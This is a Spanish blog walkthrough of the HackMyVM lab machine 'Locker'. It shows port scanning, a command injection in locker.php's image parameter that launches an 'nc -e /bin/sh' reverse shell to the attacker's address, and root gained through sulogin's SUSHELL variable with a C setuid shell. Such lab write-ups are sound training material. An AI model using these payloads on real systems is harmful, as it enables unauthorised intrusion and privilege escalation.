---
layout: single
title: Locker - HackMyVM
excerpt: "Locker máquina Linux creada por sML, en esta máquina veremos un rce un tanto curioso el cual nos permitirá tener acceso al sistema, una vez dentro del sistema elevaremos privilegios con un programa que nos compilaremos en c y usando las variables de entorno del sistema."
date: 2022-01-17
classes: wide
header:
  teaser: /assets/images/hmvm-Locker/hmvmLocker.png
  teaser_home_page: true
  icon: /assets/images/hmvm.png
categories:
  - hackmyvm
  - linux
  - Fácil
tags:
  - hackmyvm
  - rce
  - env
  - suid
  - sML
---

### Escaneo de puertos
```console
nmap -p- --open -T5 -v -n 10.0.2.20

PORT   STATE SERVICE
80/tcp open  http
```

### Escaneo de servicios
```console
nmap -sCV -p 80 10.0.2.20

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Site doesn't have a title (text/html).
```

### Web
![](/assets/images/hmvm-Locker/web.png)

Si hago click en Model 1 nos muestra lo siguiente.

![](/assets/images/hmvm-Locker/image1.png)

Al inspeccionar el código fuente veo que es una imagen codificada en base64.

![](/assets/images/hmvm-Locker/codigoFb64.png)

Uso wfuzz para encontrar más parámetros de la variable image.

![](/assets/images/hmvm-Locker/wfuzz.png)

Si cambiamos a 2 o 3 veremos imágenes diferentes.

![](/assets/images/hmvm-Locker/image2.png)

![](/assets/images/hmvm-Locker/image3.png)

Si pongo el número 4 muestra lo siguiente:

![](/assets/images/hmvm-Locker/imagenrota.png)


Después de mucho tiempo me doy cuenta de que tengo un bonito RCE.

![](/assets/images/hmvm-Locker/rce.png)

Obtengo acceso al sistema.

```console
view-source:http://10.0.2.20/locker.php?image=;nc%20-e%20/bin/sh%2010.0.2.4%204444;
```

![](/assets/images/hmvm-Locker/acceso.png)

Lanzo un cat al fichero ``/etc/passwd``  para ver que usuarios tiene el sistema.

```console
www-data@locker:~$ cat /etc/passwd | grep "/bin/bash"
root:x:0:0:root:/root:/bin/bash
tolocker:x:1000:1000:tolocker,,,:/home/tolocker:/bin/bash
```

Me voy a la carpeta del usuario tolocker pero no puedo leer la flag porque no tengo permiso.

```console
www-data@locker:/home/tolocker$ ls
flag.sh  user.txt
www-data@locker:/home/tolocker$ cat user.txt 
cat: user.txt: Permission denied
```

Enumero el sistema en busca de binarios SUID y encuentro sulogin.

```console
www-data@locker:/home/tolocker$ find / -perm -4000 2>/dev/null
/usr/sbin/sulogin
```

Si ejecuto sulogin directamente, sólo puedo obtener un shell sin privilegios de root.

![](/assets/images/hmvm-Locker/sulogin.png)

Buscando información sobre sulogin he encontrado esto:

![](/assets/images/hmvm-Locker/infosulogin.png)

https://es.manpages.org/sulogin/8


Ahora crearé una shell en C.

```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void){
setuid(0);
setgid(0);
system("/bin/bash");
}
```

Compilo la shell, la subo al equipo víctima y le doy permisos de ejecución con chmod.
`gcc noname.c -o shell`

Ahora añado la shell a la variable de entorno SUSHELL.
`www-data@locker:/tmp$ export SUSHELL=/tmp/shell`

Lanzo env para verificar que la variable de entorno se ha creado correctamente.

![](/assets/images/hmvm-Locker/SUSHELLenvOk.png)

Lanzo de nuevo sulogin con la flag -e y obtengo el root.

![](/assets/images/hmvm-Locker/root.png)

Como root ya puedo leer la flag de user y la flag de root.

![](/assets/images/hmvm-Locker/flags.png)

